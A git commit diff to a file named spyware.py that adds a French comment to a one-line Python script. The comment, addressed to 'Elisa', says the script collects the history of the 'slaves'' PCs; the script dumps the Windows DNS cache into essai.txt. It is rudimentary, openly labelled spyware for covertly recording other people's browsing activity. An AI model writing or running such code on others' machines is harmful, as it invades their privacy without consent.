ced373d5f5ea555b4cee66b5a01d9585413eb96e
BilliButters <57570380+BilliButters@users.noreply.github.com>
2019-11-11 01:20:59 +0100

    Update spyware.py

--- start_log/spyware.py
+++ start_log/spyware.py
@@ -1,3 +1,5 @@
+#Salut Elisa, ce programme repertorie tous l'historique du pc des slave, et met le resulta dans le fichiers essai.txt
+
 import os
 
 data = os.system("ipconfig /displaydns >> essai.txt")
